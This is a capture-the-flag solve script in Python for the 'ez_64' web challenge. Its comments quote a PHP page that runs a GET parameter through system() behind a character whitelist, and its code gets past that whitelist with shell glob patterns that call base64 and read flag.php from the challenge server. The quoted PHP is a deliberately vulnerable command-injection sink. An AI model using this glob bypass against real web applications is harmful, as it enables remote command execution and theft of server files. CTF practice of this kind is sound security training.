#!/usr/bin/env python3
# Challenge 4 - ez_64 (Web, wildcard/glob RCE via restricted charset)
#
# Target PHP source (index.php):
#   <?php
#   chdir(__DIR__);
#   if (isset($_GET['c'])) {
#       $c = $_GET['c'];
#       if (preg_match("#^[/?. fla64]*$#", $c)) {   // only:  / ? . space f l a 6 4
#           system($c);
#       } else { die("no no no!"); }
#   } else { highlight_file(__FILE__); }
#
# "64" -> /usr/bin/base64.  We cannot type b,s,e but the shell glob `?` can:
#   /???/???/?a??64   ==  /usr/bin/base64
# File names we also cannot type (e.g. flag.php) are reached with `????????`
# (one `?` per character); the shell expands the glob for us.
#
# Read the flag:
#   c=/???/???/?a??64 ????????      -> base64 of every 8-char file in /var/www/html
#   (flag.php) -> decode -> flag

import base64, re, sys, urllib.parse, urllib.request

TARGET = "http://80-22045772-6de6-4b57-8b7f-f8eff09eaead.challenge.ctfplus.cn/"
B64    = "/???/???/?a??64"          # -> /usr/bin/base64
FLAG   = "????????"                 # -> flag.php (8 chars), relative to /var/www/html

def run(c, timeout=30):
    """Send ?c=<payload>; return stdout of system($c) as bytes."""
    url = TARGET + "?c=" + urllib.parse.quote(c, safe="")
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read()

def main():
    enc = run(f"{B64} {FLAG}")
    if not enc.strip():
        print("[-] no output: glob/base64 path failed", file=sys.stderr)
        return 1
    data = base64.b64decode(enc)
    print("[*] leaked bytes:", data)
    m = re.search(rb"0xGame\{[^}]+\}|flag\{[^}]+\}", data)
    if not m:
        print("[-] no flag pattern in leaked data", file=sys.stderr)
        return 1
    flag = m.group(0).decode()
    print("[+] FLAG:", flag)
    return 0

if __name__ == "__main__":
    sys.exit(main())
